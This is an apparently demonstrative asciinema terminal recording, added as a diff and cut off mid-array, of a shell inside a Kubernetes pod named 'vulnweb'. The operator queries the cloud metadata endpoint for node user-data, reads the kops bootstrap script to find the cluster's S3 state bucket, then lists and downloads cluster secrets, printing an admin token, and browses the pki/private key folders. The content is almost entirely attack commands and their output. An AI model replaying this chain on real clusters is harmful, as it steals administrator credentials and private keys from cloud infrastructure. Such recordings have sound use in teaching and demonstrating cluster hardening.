@@ -1,0 +1,1154 @@
+{
+  "version": 1,
+  "width": 90,
+  "height": 25,
+  "duration": 68.259757,
+  "command": "/bin/bash --rcfile ~/.bash_profile",
+  "title": null,
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.271817,
+      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+    ],
+    [
+      0.436399,
+      "ku"
+    ],
+    [
+      6.6e-05,
+      "bectl ex"
+    ],
+    [
+      5.1e-05,
+      "e"
+    ],
+    [
+      8.7e-05,
+      "c"
+    ],
+    [
+      0.000104,
+      " -it "
+    ],
+    [
+      4.3e-05,
+      "vu"
+    ],
+    [
+      3.7e-05,
+      "l"
+    ],
+    [
+      5.8e-05,
+      "n"
+    ],
+    [
+      0.000127,
+      "we"
+    ],
+    [
+      0.000204,
+      "b-256"
+    ],
+    [
+      0.00014,
+      "994140"
+    ],
+    [
+      5.5e-05,
+      "5-q"
+    ],
+    [
+      3.8e-05,
+      "8"
+    ],
+    [
+      5.4e-05,
+      "v9"
+    ],
+    [
+      9.9e-05,
+      "r"
+    ],
+    [
+      4.5e-05,
+      " /"
+    ],
+    [
+      4.1e-05,
+      "b"
+    ],
+    [
+      3.6e-05,
+      "i"
+    ],
+    [
+      4.8e-05,
+      "n/"
+    ],
+    [
+      0.000151,
+      "b"
+    ],
+    [
+      3.6e-05,
+      "as"
+    ],
+    [
+      2.6e-05,
+      "h"
+    ],
+    [
+      0.105949,
+      "\r\n"
+    ],
+    [
+      0.388168,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "\r                                                                                         \rroot@vulnweb-2569941405-q8v9r:/# export TERM=xterm"
+    ],
+    [
+      0.601872,
+      "\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.631653,
+      "c"
+    ],
+    [
+      0.113768,
+      "l"
+    ],
+    [
+      0.089415,
+      "e"
+    ],
+    [
+      0.066978,
+      "a"
+    ],
+    [
+      0.047983,
+      "r"
+    ],
+    [
+      0.109079,
+      "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "curl -sk http://169.254.169.254/latest/user-data"
+    ],
+    [
+      0.984463,
+      "\r\n"
+    ],
+    [
+      0.007295,
+      "#!/bin/bash\r\n# Copyright 2016 The Kubernetes Authors All rights reserved.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#     http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\n\r\nset -o errexit\r\nset -o nounset\r\nset -o pipefail\r\n\r\nNODEUP_URL=https://kubeupv2.s3.amazonaws.com/kops/1.7.0/linux/amd64/nodeup\r\nNODEUP_HASH=\r\n\r\n\r\n\r\n\r\nfunction ensure-install-dir() {\r\n  INSTALL_DIR=\"/var/cache/kubernetes-install\"\r\n  # On ContainerOS, we install to /var/lib/toolbox install (because of noexec)\r\n  if [[ -d /var/lib/toolbox ]]; then\r\n    INSTALL_DIR=\"/var/lib/toolbox/kubernet"
+    ],
+    [
+      9.5e-05,
+      "es-install\"\r\n  fi\r\n  mkdir -p ${INSTALL_DIR}\r\n  cd ${INSTALL_DIR}\r\n}\r\n\r\n# Retry a download until we get it. Takes a hash and a set of URLs.\r\n#\r\n# $1 is the sha1 of the URL. Can be \"\" if the sha1 is unknown.\r\n# $2+ are the URLs to download.\r\ndownload-or-bust() {\r\n  local -r hash=\"$1\"\r\n  shift 1\r\n\r\n  urls=( $* )\r\n  while true; do\r\n    for url in \"${urls[@]}\"; do\r\n      local file=\"${url##*/}\"\r\n      rm -f \"${file}\"\r\n      if ! curl -f --ipv4 -Lo \"${file}\" --connect-timeout 20 --retry 6 --retry-delay 10 \"${url}\"; then\r\n        echo \"== Failed to download ${url}. Retrying. ==\"\r\n      elif [[ -n \"${hash}\" ]] && ! validate-hash \"${file}\" \"${hash}\"; then\r\n        echo \"== Hash validation of ${url} failed. Retrying. ==\"\r\n      else\r\n        if [[ -n \"${hash}\" ]]; then\r\n          echo \"== Downloaded ${url} (SHA1 = ${hash}) ==\"\r\n        else\r\n          echo \"== Downloaded ${url} ==\"\r\n        fi\r\n        return\r\n      fi\r\n    done\r\n\r\n    echo \"All downloads failed; sleeping before retrying\"\r\n    sleep 60\r\n  done\r\n}\r\n\r\nv"
+    ],
+    [
+      0.00013,
+      "alidate-hash() {\r\n  local -r file=\"$1\"\r\n  local -r expected=\"$2\"\r\n  local actual\r\n\r\n  actual=$(sha1sum ${file} | awk '{ print $1 }') || true\r\n  if [[ \"${actual}\" != \"${expected}\" ]]; then\r\n    echo \"== ${file} corrupted, sha1 ${actual} doesn't match expected ${expected} ==\"\r\n    return 1\r\n  fi\r\n}\r\n\r\nfunction split-commas() {\r\n  echo $1 | tr \",\" \"\\n\"\r\n}\r\n\r\nfunction try-download-release() {\r\n  # TODO(zmerlynn): Now we REALLY have no excuse not to do the reboot\r\n  # optimization.\r\n\r\n  local -r nodeup_urls=( $(split-commas \"${NODEUP_URL}\") )\r\n  local -r nodeup_filename=\"${nodeup_urls[0]##*/}\"\r\n  if [[ -n \"${NODEUP_HASH:-}\" ]]; then\r\n    local -r nodeup_hash=\"${NODEUP_HASH}\"\r\n  else\r\n  # TODO: Remove?\r\n    echo \"Downloading sha1 (not found in env)\"\r\n    download-or-bust \"\" \"${nodeup_urls[@]/%/.sha1}\"\r\n    local -r nodeup_hash=$(cat \"${nodeup_filename}.sha1\")\r\n  fi\r\n\r\n  echo \"Downloading nodeup (${nodeup_urls[@]})\"\r\n  download-or-bust \"${nodeup_hash}\" \"${nodeup_urls[@]}\"\r\n\r\n  chmod +x nodeup\r\n}\r\n\r\nfunction download"
+    ],
+    [
+      0.00041,
+      "-release() {\r\n  # In case of failure checking integrity of release, retry.\r\n  until try-download-release; do\r\n    sleep 15\r\n    echo \"Couldn't download release. Retrying...\"\r\n  done\r\n\r\n  echo \"Running nodeup\"\r\n  # We can't run in the foreground because of https://github.com/docker/docker/issues/23793\r\n  ( cd ${INSTALL_DIR}; ./nodeup --install-systemd-unit --conf=${INSTALL_DIR}/kube_env.yaml --v=8  )\r\n}\r\n\r\n####################################################################################\r\n\r\n/bin/systemd-machine-id-setup || echo \"failed to set up ensure machine-id configured\"\r\n\r\necho \"== nodeup node config starting ==\"\r\nensure-install-dir\r\n\r\ncat > kube_env.yaml << __EOF_KUBE_ENV\r\nAssets:\r\n- 7bf3fda43bb8d0a55622ca68dcbfaf3cc7f2dddc@https://storage.googleapis.com/kubernetes-release/release/v1.7.4/bin/linux/amd64/kubelet\r\n- 819010a7a028b165f5e6df37b1bb7713ff6d070f@https://storage.googleapis.com/kubernetes-release/release/v1.7.4/bin/linux/amd64/kubectl\r\n- 1d9788b0f5420e1a219aad2cb8681823fc515e7c@https://storage.g"
+    ],
+    [
+      9.1e-05,
+      "oogleapis.com/kubernetes-release/network-plugins/cni-0799f5732f2a11b329d9e3d51b9c8f2e3759f2ff.tar.gz\r\n- 5d95d64d7134f202ba60b1fa14adaff138905d15@https://kubeupv2.s3.amazonaws.com/kops/1.7.0/linux/amd64/utils.tar.gz\r\nClusterName: kube.lonimbus.com\r\nConfigBase: s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com\r\nInstanceGroupName: nodes\r\nTags:\r\n- _automatic_upgrades\r\n- _aws\r\n- _networking_cni\r\nchannels:\r\n- s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/addons/bootstrap-channel.yaml\r\nprotokubeImage:\r\n  hash: 5bd97a02f0793d1906e9f446c548ececf1444737\r\n  name: protokube:1.7.0\r\n  source: https://kubeupv2.s3.amazonaws.com/kops/1.7.0/images/protokube.tar.gz\r\n\r\n__EOF_KUBE_ENV\r\n\r\ndownload-release\r\necho \"== nodeup node config done ==\"\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "curl -sk http://169.254.169.254/latest/user-data"
+    ],
+    [
+      0.540577,
+      " "
+    ],
+    [
+      0.383747,
+      "|"
+    ],
+    [
+      0.134363,
+      " "
+    ],
+    [
+      0.290276,
+      "l"
+    ],
+    [
+      0.056889,
+      "e"
+    ],
+    [
+      0.148397,
+      "s"
+    ],
+    [
+      0.156289,
+      "s"
+    ],
+    [
+      0.134106,
+      "\r\n"
+    ],
+    [
+      0.001393,
+      "\u001b[?1049h\u001b[?1h\u001b=\r"
+    ],
+    [
+      0.006796,
+      "#!/bin/bash\r\n# Copyright 2016 The Kubernetes Authors All rights reserved.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#     http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\n\r\nset -o errexit\r\nset -o nounset\r\nset -o pipefail\r\n\r\nNODEUP_URL=https://kubeupv2.s3.amazonaws.com/kops/1.7.0/linux/amd64/nodeup\r\nNODEUP_HASH=\r\n\r\n\r\n\r\n:\u001b[K"
+    ],
+    [
+      0.735625,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.587231,
+      "\r\u001b[Kfunction ensure-install-dir() {\r\n:\u001b[K"
+    ],
+    [
+      0.034455,
+      "\r\u001b[K  INSTALL_DIR=\"/var/cache/kubernetes-install\"\r\n:\u001b[K"
+    ],
+    [
+      0.042745,
+      "\r\u001b[K  # On ContainerOS, we install to /var/lib/toolbox install (because of noexec)\r\n:\u001b[K"
+    ],
+    [
+      0.023922,
+      "\r\u001b[K  if [[ -d /var/lib/toolbox ]]; then\r\n:\u001b[K"
+    ],
+    [
+      0.032476,
+      "\r\u001b[K    INSTALL_DIR=\"/var/lib/toolbox/kubernetes-install\"\r\n:\u001b[K"
+    ],
+    [
+      0.034876,
+      "\r\u001b[K  fi\r\n:\u001b[K"
+    ],
+    [
+      0.042737,
+      "\r\u001b[K  mkdir -p ${INSTALL_DIR}\r\n:\u001b[K"
+    ],
+    [
+      0.026341,
+      "\r\u001b[K  cd ${INSTALL_DIR}\r\n:\u001b[K"
+    ],
+    [
+      0.03863,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.029991,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.037062,
+      "\r\u001b[K# Retry a download until we get it. Takes a hash and a set of URLs.\r\n:\u001b[K"
+    ],
+    [
+      0.034711,
+      "\r\u001b[K#\r\n:\u001b[K"
+    ],
+    [
+      0.037893,
+      "\r\u001b[K# $1 is the sha1 of the URL. Can be \"\" if the sha1 is unknown.\r\n:\u001b[K"
+    ],
+    [
+      0.276921,
+      "\r\u001b[K# $2+ are the URLs to download.\r\n:\u001b[K"
+    ],
+    [
+      0.578947,
+      "\r\u001b[Kdownload-or-bust() {\r\n:\u001b[K"
+    ],
+    [
+      0.034462,
+      "\r\u001b[K  local -r hash=\"$1\"\r\n:\u001b[K"
+    ],
+    [
+      0.05073,
+      "\r\u001b[K  shift 1\r\n:\u001b[K"
+    ],
+    [
+      0.015958,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.036576,
+      "\r\u001b[K  urls=( $* )\r\n:\u001b[K"
+    ],
+    [
+      0.030699,
+      "\r\u001b[K  while true; do\r\n:\u001b[K"
+    ],
+    [
+      0.038875,
+      "\r\u001b[K    for url in \"${urls[@]}\"; do\r\n:\u001b[K"
+    ],
+    [
+      0.035962,
+      "\r\u001b[K      local file=\"${url##*/}\"\r\n:\u001b[K"
+    ],
+    [
+      0.034821,
+      "\r\u001b[K      rm -f \"${file}\"\r\n:\u001b[K"
+    ],
+    [
+      0.034528,
+      "\r\u001b[K      if ! curl -f --ipv4 -Lo \"${file}\" --connect-timeout 20 --retry 6 --retry-delay 10 \"$ \b:\u001b[K"
+    ],
+    [
+      0.034429,
+      "\r\u001b[K{url}\"; then\r\n:\u001b[K"
+    ],
+    [
+      0.040587,
+      "\r\u001b[K        echo \"== Failed to download ${url}. Retrying. ==\"\r\n:\u001b[K"
+    ],
+    [
+      0.030624,
+      "\r\u001b[K      elif [[ -n \"${hash}\" ]] && ! validate-hash \"${file}\" \"${hash}\"; then\r\n:\u001b[K"
+    ],
+    [
+      0.038805,
+      "\r\u001b[K        echo \"== Hash validation of ${url} failed. Retrying. ==\"\r\n:\u001b[K"
+    ],
+    [
+      0.030281,
+      "\r\u001b[K      else\r\n:\u001b[K"
+    ],
+    [
+      0.036284,
+      "\r\u001b[K        if [[ -n \"${hash}\" ]]; then\r\n:\u001b[K"
+    ],
+    [
+      0.032921,
+      "\r\u001b[K          echo \"== Downloaded ${url} (SHA1 = ${hash}) ==\"\r\n:\u001b[K"
+    ],
+    [
+      0.032153,
+      "\r\u001b[K        else\r\n:\u001b[K"
+    ],
+    [
+      0.036823,
+      "\r\u001b[K          echo \"== Downloaded ${url} ==\"\r\n:\u001b[K"
+    ],
+    [
+      0.034629,
+      "\r\u001b[K        fi\r\n:\u001b[K"
+    ],
+    [
+      0.483798,
+      "\r\u001b[K        return\r\n:\u001b[K"
+    ],
+    [
+      0.5855,
+      "\r\u001b[K      fi\r\n:\u001b[K"
+    ],
+    [
+      0.036257,
+      "\r\u001b[K    done\r\n:\u001b[K"
+    ],
+    [
+      0.04479,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.024042,
+      "\r\u001b[K    echo \"All downloads failed; sleeping before retrying\"\r\n:\u001b[K"
+    ],
+    [
+      0.038688,
+      "\r\u001b[K    sleep 60\r\n:\u001b[K"
+    ],
+    [
+      0.030744,
+      "\r\u001b[K  done\r\n:\u001b[K"
+    ],
+    [
+      0.036211,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.032676,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.035435,
+      "\r\u001b[Kvalidate-hash() {\r\n:\u001b[K"
+    ],
+    [
+      0.03565,
+      "\r\u001b[K  local -r file=\"$1\"\r\n:\u001b[K"
+    ],
+    [
+      0.032485,
+      "\r\u001b[K  local -r expected=\"$2\"\r\n:\u001b[K"
+    ],
+    [
+      0.038782,
+      "\r\u001b[K  local actual\r\n:\u001b[K"
+    ],
+    [
+      0.042587,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.024364,
+      "\r\u001b[K  actual=$(sha1sum ${file} | awk '{ print $1 }') || true\r\n:\u001b[K"
+    ],
+    [
+      0.043136,
+      "\r\u001b[K  if [[ \"${actual}\" != \"${expected}\" ]]; then\r\n:\u001b[K"
+    ],
+    [
+      0.031876,
+      "\r\u001b[K    echo \"== ${file} corrupted, sha1 ${actual} doesn't match expected ${expected} ==\"\r\n:\u001b[K"
+    ],
+    [
+      0.03241,
+      "\r\u001b[K    return 1\r\n:\u001b[K"
+    ],
+    [
+      0.038707,
+      "\r\u001b[K  fi\r\n:\u001b[K"
+    ],
+    [
+      0.380528,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.201778,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.585054,
+      "\r\u001b[Kfunction split-commas() {\r\n:\u001b[K"
+    ],
+    [
+      0.034219,
+      "\r\u001b[K  echo $1 | tr \",\" \"\\n\"\r\n:\u001b[K"
+    ],
+    [
+      0.03242,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.047011,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.036119,
+      "\r\u001b[Kfunction try-download-release() {\r\n:\u001b[K"
+    ],
+    [
+      0.025256,
+      "\r\u001b[K  # TODO(zmerlynn): Now we REALLY have no excuse not to do the reboot\r\n:\u001b[K"
+    ],
+    [
+      0.038383,
+      "\r\u001b[K  # optimization.\r\n:\u001b[K"
+    ],
+    [
+      0.033924,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.029113,
+      "\r\u001b[K  local -r nodeup_urls=( $(split-commas \"${NODEUP_URL}\") )\r\n:\u001b[K"
+    ],
+    [
+      0.038184,
+      "\r\u001b[K  local -r nodeup_filename=\"${nodeup_urls[0]##*/}\"\r\n:\u001b[K"
+    ],
+    [
+      0.032371,
+      "\r\u001b[K  if [[ -n \"${NODEUP_HASH:-}\" ]]; then\r\n:\u001b[K"
+    ],
+    [
+      0.035064,
+      "\r\u001b[K    local -r nodeup_hash=\"${NODEUP_HASH}\"\r\n:\u001b[K"
+    ],
+    [
+      0.034059,
+      "\r\u001b[K  else\r\n:\u001b[K"
+    ],
+    [
+      0.034323,
+      "\r\u001b[K  # TODO: Remove?\r\n:\u001b[K"
+    ],
+    [
+      0.036795,
+      "\r\u001b[K    echo \"Downloading sha1 (not found in env)\"\r\n:\u001b[K"
+    ],
+    [
+      0.04517,
+      "\r\u001b[K    download-or-bust \"\" \"${nodeup_urls[@]/%/.sha1}\"\r\n:\u001b[K"
+    ],
+    [
+      0.026135,
+      "\r\u001b[K    local -r nodeup_hash=$(cat \"${nodeup_filename}.sha1\")\r\n:\u001b[K"
+    ],
+    [
+      0.038881,
+      "\r\u001b[K  fi\r\n:\u001b[K"
+    ],
+    [
+      0.032762,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.038628,
+      "\r\u001b[K  echo \"Downloading nodeup (${nodeup_urls[@]})\"\r\n:\u001b[K"
+    ],
+    [
+      0.023644,
+      "\r\u001b[K  download-or-bust \"${nodeup_hash}\" \"${nodeup_urls[@]}\"\r\n:\u001b[K"
+    ],
+    [
+      0.03682,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.376675,
+      "\r\u001b[K  chmod +x nodeup\r\n:\u001b[K"
+    ],
+    [
+      0.580258,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.038333,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.04092,
+      "\r\u001b[Kfunction download-release() {\r\n:\u001b[K"
+    ],
+    [
+      0.026162,
+      "\r\u001b[K  # In case of failure checking integrity of release, retry.\r\n:\u001b[K"
+    ],
+    [
+      0.040571,
+      "\r\u001b[K  until try-download-release; do\r\n:\u001b[K"
+    ],
+    [
+      0.028683,
+      "\r\u001b[K    sleep 15\r\n:\u001b[K"
+    ],
+    [
+      0.037073,
+      "\r\u001b[K    echo \"Couldn't download release. Retrying...\"\r\n:\u001b[K"
+    ],
+    [
+      0.034268,
+      "\r\u001b[K  done\r\n:\u001b[K"
+    ],
+    [
+      0.032191,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.033063,
+      "\r\u001b[K  echo \"Running nodeup\"\r\n:\u001b[K"
+    ],
+    [
+      0.032365,
+      "\r\u001b[K  # We can't run in the foreground because of https://github.com/docker/docker/issues/2379 \b:\u001b[K"
+    ],
+    [
+      0.039363,
+      "\r\u001b[K3\r\n:\u001b[K"
+    ],
+    [
+      0.033856,
+      "\r\u001b[K  ( cd ${INSTALL_DIR}; ./nodeup --install-systemd-unit --conf=${INSTALL_DIR}/kube_env.yaml \b:\u001b[K"
+    ],
+    [
+      0.032435,
+      "\r\u001b[K --v=8  )\r\n:\u001b[K"
+    ],
+    [
+      0.038641,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.044939,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.022189,
+      "\r\u001b[K####################################################################################\r\n:\u001b[K"
+    ],
+    [
+      0.038487,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.03061,
+      "\r\u001b[K/bin/systemd-machine-id-setup || echo \"failed to set up ensure machine-id configured\"\r\n:\u001b[K"
+    ],
+    [
+      0.042076,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.025868,
+      "\r\u001b[Kecho \"== nodeup node config starting ==\"\r\n:\u001b[K"
+    ],
+    [
+      0.036259,
+      "\r\u001b[Kensure-install-dir\r\n:\u001b[K"
+    ],
+    [
+      0.028453,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.040793,
+      "\r\u001b[Kcat > kube_env.yaml << __EOF_KUBE_ENV\r\n:\u001b[K"
+    ],
+    [
+      0.0283,
+      "\r\u001b[KAssets:\r\n:\u001b[K"
+    ],
+    [
+      0.036709,
+      "\r\u001b[K- 7bf3fda43bb8d0a55622ca68dcbfaf3cc7f2dddc@https://storage.googleapis.com/kubernetes-relea \b:\u001b[K"
+    ],
+    [
+      0.034366,
+      "\r\u001b[Kse/release/v1.7.4/bin/linux/amd64/kubelet\r\n:\u001b[K"
+    ],
+    [
+      0.036737,
+      "\r\u001b[K- 819010a7a028b165f5e6df37b1bb7713ff6d070f@https://storage.googleapis.com/kubernetes-relea \b:\u001b[K"
+    ],
+    [
+      0.036398,
+      "\r\u001b[Kse/release/v1.7.4/bin/linux/amd64/kubectl\r\n:\u001b[K"
+    ],
+    [
+      0.044991,
+      "\r\u001b[K- 1d9788b0f5420e1a219aad2cb8681823fc515e7c@https://storage.googleapis.com/kubernetes-relea \b:\u001b[K"
+    ],
+    [
+      0.023956,
+      "\r\u001b[Kse/network-plugins/cni-0799f5732f2a11b329d9e3d51b9c8f2e3759f2ff.tar.gz\r\n:\u001b[K"
+    ],
+    [
+      0.040982,
+      "\r\u001b[K- 5d95d64d7134f202ba60b1fa14adaff138905d15@https://kubeupv2.s3.amazonaws.com/kops/1.7.0/li \b:\u001b[K"
+    ],
+    [
+      0.519308,
+      "\r\u001b[Knux/amd64/utils.tar.gz\r\n:\u001b[K"
+    ],
+    [
+      0.586399,
+      "\r\u001b[KClusterName: kube.lonimbus.com\r\n:\u001b[K"
+    ],
+    [
+      0.032199,
+      "\r\u001b[KConfigBase: s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com\r\n:\u001b[K"
+    ],
+    [
+      0.046848,
+      "\r\u001b[KInstanceGroupName: nodes\r\n:\u001b[K"
+    ],
+    [
+      0.023997,
+      "\r\u001b[KTags:\r\n:\u001b[K"
+    ],
+    [
+      0.043166,
+      "\r\u001b[K- _automatic_upgrades\r\n:\u001b[K"
+    ],
+    [
+      0.023998,
+      "\r\u001b[K- _aws\r\n:\u001b[K"
+    ],
+    [
+      0.043141,
+      "\r\u001b[K- _networking_cni\r\n:\u001b[K"
+    ],
+    [
+      0.024534,
+      "\r\u001b[Kchannels:\r\n:\u001b[K"
+    ],
+    [
+      0.042579,
+      "\r\u001b[K- s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/addons/bootstrap-channel.yaml\r\n:\u001b[K"
+    ],
+    [
+      0.328019,
+      "\r\u001b[KprotokubeImage:\r\n:\u001b[K"
+    ],
+    [
+      0.14329,
+      "\r\u001b[K  hash: 5bd97a02f0793d1906e9f446c548ececf1444737\r\n:\u001b[K"
+    ],
+    [
+      0.292409,
+      "\r\u001b[K  name: protokube:1.7.0\r\n:\u001b[K"
+    ],
+    [
+      0.190932,
+      "\r\u001b[K  source: https://kubeupv2.s3.amazonaws.com/kops/1.7.0/images/protokube.tar.gz\r\n:\u001b[K"
+    ],
+    [
+      0.188603,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.89298,
+      "\r\u001b[K__EOF_KUBE_ENV\r\n:\u001b[K"
+    ],
+    [
+      0.83291,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      2.0,
+      "\r\u001b[K\u001b[?1l\u001b>\u001b[?1049lroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonim"
+    ],
+    [
+      0.000355,
+      "bus.com \r/"
+    ],
+    [
+      0.292306,
+      "\r\n"
+    ],
+    [
+      0.311688,
+      "                           PRE addons/\r\n                           PRE instancegroup/\r\n                           PRE pki/\r\n                           PRE secrets/\r\n2017-10-26 03:18:50       4168 cluster.spec\r\n"
+    ],
+    [
+      0.000115,
+      "2017-10-26 03:18:48        868 config\r\n"
+    ],
+    [
+      0.040287,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/\r/"
+    ],
+    [
+      0.778497,
+      "s"
+    ],
+    [
+      0.168839,
+      "e"
+    ],
+    [
+      0.225463,
+      "c"
+    ],
+    [
+      0.235787,
+      "r"
+    ],
+    [
+      0.146043,
+      "e"
+    ],
+    [
+      0.146473,
+      "t"
+    ],
+    [
+      0.178812,
+      "s"
+    ],
+    [
+      0.406296,
+      "/"
+    ],
+    [
+      0.348757,
+      "\r\n"
+    ],
+    [
+      0.315345,
+      "2017-10-26 03:18:51         55 admin\r\n2017-10-26 03:18:51         55 kube\r\n"
+    ],
+    [
+      0.000686,
+      "2017-10-26 03:18:51         55 kube-proxy\r\n2017-10-26 03:18:51         55 kubelet\r\n2017-10-26 03:18:51         55 system:controller_manager\r\n2017-10-26 03:18:51         55 system:dns\r\n"
+    ],
+    [
+      0.000323,
+      "2017-10-26 03:18:51         55 system:logging\r\n2017-10-26 03:18:51         55 system:monitoring\r\n"
+    ],
+    [
+      0.001291,
+      "2017-10-26 03:18:51         55 system:scheduler\r\n"
+    ],
+    [
+      0.032364,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.258043,
+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/\r/secrets/"
+    ],
+    [
+      2.0,
+      "\u001b[A\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[K\r\n\r\u001b[K\u001b[A\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C"
+    ],
+    [
+      2.0,
+      "aws s3 cp s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com \r/secrets/admin ."
+    ],
+    [
+      0.365262,
+      "\r\n"
+    ],
+    [
+      0.420707,
+      "Completed 55 Bytes/55 Bytes (631 Bytes/s) with 1 file(s) remaining\r"
+    ],
+    [
+      0.000516,
+      "download: s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/secrets/admin to ./admin\r\n"
+    ],
+    [
+      0.085419,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.082103,
+      "c"
+    ],
+    [
+      0.113638,
+      "a"
+    ],
+    [
+      0.111775,
+      "t"
+    ],
+    [
+      0.067093,
+      " "
+    ],
+    [
+      0.079329,
+      "a"
+    ],
+    [
+      0.102109,
+      "d"
+    ],
+    [
+      0.235327,
+      "min "
+    ],
+    [
+      0.190783,
+      "\r\n"
+    ],
+    [
+      0.000827,
+      "{\"Data\":\"STJCMHF6cVFKM0hpbzdDbTdnUjdPdUJ0TXpURGFPdkU=\"}root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "c"
+    ],
+    [
+      0.279826,
+      "l"
+    ],
+    [
+      0.123646,
+      "e"
+    ],
+    [
+      0.069384,
+      "a"
+    ],
+    [
+      0.086891,
+      "r"
+    ],
+    [
+      0.550829,
+      "\r\n"
+    ],
+    [
+      0.000826,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com \r/pki/"
+    ],
+    [
+      0.332802,
+      "\r\n"
+    ],
+    [
+      0.336548,
+      "                           PRE issued/\r\n                           PRE private/\r\n                           PRE ssh/\r\n"
+    ],
+    [
+      0.017041,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      1.625808,
+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/\r/pki/"
+    ],
+    [
+      1.182511,
+      "p"
+    ],
+    [
+      0.111629,
+      "r"
+    ],
+    [
+      0.091516,
+      "i"
+    ],
+    [
+      0.077084,
+      "v"
+    ],
+    [
+      0.123998,
+      "a"
+    ],
+    [
+      0.078919,
+      "t"
+    ],
+    [
+      0.066999,
+      "e"
+    ],
+    [
+      0.496096,
+      "/"
+    ],
+    [
+      0.213287,
+      "\r\n"
+    ],
+    [
+      0.318082,
+      "                           PRE ca/\r\n                           PRE kops/\r\n                           PRE kube-controller-manager/\r\n                           PRE kube-proxy/\r\n                           PRE kube-scheduler/\r\n                           PRE kubecfg/\r\n                           PRE kubelet/\r\n                           PRE master/\r\n"
+    ],
+    [
+      0.030904,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.56173,
